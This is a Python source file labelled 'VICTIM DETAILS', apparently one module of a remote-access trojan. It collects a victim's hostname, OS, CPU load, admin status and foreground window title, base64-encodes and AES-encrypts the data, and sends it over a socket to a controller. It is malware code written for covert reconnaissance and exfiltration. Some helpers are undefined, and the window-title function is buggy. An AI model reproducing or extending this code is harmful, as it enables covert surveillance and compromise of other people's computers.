'''
VICTIM DETAILS
VERSION : 1.0.0
AUTHOR : ISSAC

'''

import ctypes
import socket
import platform
import os
from subprocess import Popen, PIPE

# Check is administrator
class Details:
    def __init__(self, sock) -> None:
        self.sock = sock

    '''
    CHECK ADMINISTRATOR PRIVILEDGE
    '''
    def is_admin(self) -> bool:
        try:
            if unix_like():
                return os.getuid() == 0
            else:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

    '''
    GET CPU USAGE
    '''
    def cpu(self) -> float:
        if unix_like():
            return None
        else:
            # GET SYSTEMTIME
            user, kernel, idle = ctypes.c_ulonglong(), ctypes.c_ulonglong(), ctypes.c_ulonglong()
            ctypes.windll.kernel32.GetSystemTimes(ctypes.byref(user), ctypes.byref(kernel), ctypes.byref(idle))
            
            # CAUCULATE CPU PERCENTAGE
            total_time = user.value + kernel.value
            idle_time = idle.value
            cpu_usage_percent = (total_time - idle_time) / total_time * 100
            return cpu_usage_percent

    '''
    ACTIVE WINDOW TITLE (Linux & Windows)
    '''
    def active_window(self):
        if unix_like(): # UNIX LIKE
            return ''
        else: # WINDOWS
            import ctypes.wintypes
            
            # Windows API - user32
            user32 = ctypes.windll.user32

            GetForegroundWindow = user32.GetForegroundWindow
            GetWindowTextLength = user32.GetWindowTextLengthW
            GetWindowText = user32.GetWindowTextW

            hWnd = GetForegroundWindow

            length = GetWindowTextLength()
            title = ctypes.create_unicode_buffer(length + 1)            

            GetWindowText(hWnd, title, length + 1)
            return title.value

    '''
    INFORMATION
    '''
    def info_basic(self) -> dict:
        _dict = {
            "Hostname" : socket.gethostname(),
            "Status" : "Online",
            "OS" : platform.platform(),
            "CPU" : str(self.cpu()),
            "Payload" : "Python",
            "Webcam" : "Webcam",
            "Desktop" : "Desktop"
        }
        return _dict

    '''
    MAIN RETURN FUNCTION
    '''
    def details(self) -> dict:
        info_list = {
            'BASIC' : self.info_basic(),
            'DEVICE' : dict(),
        }
        return info_list
    
    def encapsulation(self, info_dict:dict):
        l1 = []
        for group in info_dict.keys():
            assert isinstance(group, str)
            l2 = []
            info = info_dict[group]
            assert isinstance(info, dict)
            l3 = ','.join([f'{key}:{b64EnStr(info[key])}' for key in info.keys()])
            l2.append(l3)
            l2_str = ','.join([b64EnStr(x) for x in l2])
            l1.append(f'{group}:{l2_str}')
        payload = ','.join([b64EnStr(x) for x in l1])
        return payload
    
    def run(self):
        info = self.details()
        print(info)
        payload = self.encapsulation(info)

        payload = "Details|" + payload
        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))